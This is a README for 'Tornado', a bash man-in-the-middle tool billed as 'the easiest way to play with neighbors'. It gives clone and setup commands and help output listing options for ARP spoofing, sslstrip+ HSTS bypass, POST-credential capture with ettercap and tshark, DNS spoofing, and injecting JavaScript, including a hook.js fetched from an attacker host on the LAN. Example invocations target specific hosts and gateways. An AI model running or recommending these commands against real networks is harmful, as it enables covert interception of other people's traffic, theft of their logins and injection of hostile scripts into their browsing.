# TORNADO
## The easiest way to play with neighbors
### setup
```
git clone https://github.com/rebellionil/tornado
cd tornado 
bash setup.sh
```
### ```./tornado.sh -h ``` output 
```

                 ████████╗ ██████╗ ██████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗  
                 ╚══██╔══╝██╔═══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗
                    ██║   ██║   ██║██████╔╝██╔██╗ ██║███████║██║  ██║██║   ██║
                    ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══██║██║  ██║██║   ██║
                    ██║   ╚██████╔╝██║  ██║██║ ╚████║██║  ██║██████╔╝╚██████╔╝
                    ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝||╚═════╝ 
                     Version 0.1 [DEMO] - CODED BY MAGDY MOUSTAFA  ||||       
                     - github.com/rebellionil/tornado           |__||||__|    
                     - facebook.com/rebellionil                 ++++++++++    
                                                                ||||||||||    

 ┌══════════════════════════════════════════════════════════════════════════════════════════════════════┐ 
 █ -h --help         => guess what ?                                                                    █ 
 █ -t --target       => specify target                                                                  █ 
 ║ -g --gateway      => specify gateway                                                                 ║ 
 ║ -i --interface    => specify an interface                                                            ║ 
 ║ -o --savelog      => save sslstrip+ results                                                          ║ 
 ║ -f --forward      => forward traffic                                               [ON/off]          ║ 
 ║ -d --driftnet     => enable driftnet to extract images from session pcap file      [on/OFF]          ║ 
 ║ -u --urlsnarf     => log GET/POST requests with urlsnarf                           [on/OFF]          ║ 
 ║ -s --silent       => run arpspoof and dns2proxy in background                      [on/OFF]          ║ 
 ║ -k --tshark       => capture detailed post requests info with tshark               [on/OFF]          ║ 
 ║ -e --ettercap     => capture post requests with ettercap (RECOMMENDED)             [on/OFF]          ║ 
 ║ -m --tcpdump      => capture post requests with TCPdump                            [on/OFF]          ║ 
 ║ -K --tskark+      => capture GET/POST requests headers with tshark                 [on/OFF]          ║ 
 ║ -p --dnsspoof     => DNS spoofing with dns2proxy (DOMAIN => FAKE_IP)               [on/OFF]          ║ 
 ║ -r --iptraf       => monitor network traffic with iptraf-ng                        [on/OFF]          ║ 
 ║ -a --etherape     => monitor network traffic with etherape                         [on/OFF]          ║ 
 ║ -x --burp         => intercept captured traffic with burpsuite                                       ║ 
 ║ -X --mitmproxy    => intercept captured traffic with MITMproxy                                       ║ 
 ║ -H --hsts         => intercept captured traffic with sslstrip+,dns2proxy                             ║ 
 ║ -l --js-url       => inject JS url in page content                                                   ║ 
 ║ -L --js-code      => inject JS code from JS file in page content ( must be one line )                ║ 
 ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.1/24 -g 192.168.1.1 --ettercap --hsts -o ssl.log              ║ 
 ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.10 -g 192.168.1.1 -f                                          ║ 
 ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.10 -g 192.168.1.1 -l http://192.168.1.100:3000/hook.js        ║ 
 ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.10 -g 192.168.1.1 -L alert.js                                 ║ 
 ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.2,192.168.1.5,192.168.1.10 -g 192.168.1.1 --hsts -e -k -d -u  ║ 
 █ eg. ./tornado.sh -i wlan0 -t 192.168.1.5 -g 192.168.1.1 --burp                                       █ 
 █ eg. ./tornado.sh -i wlan0 -t 192.168.1.5 -g 192.168.1.1 --dnsspoof dnsfile.txt                       █ 
 └══════════════════════════════════════════════════════════════════════════════════════════════════════┘ 

```


### Thanks for Leonardo Nve
The orginal dns2proxy : https://github.com/LeonardoNve/dns2proxy

A mirror of the original SSLstrip+ : https://github.com/byt3bl33d3r/sslstrip2



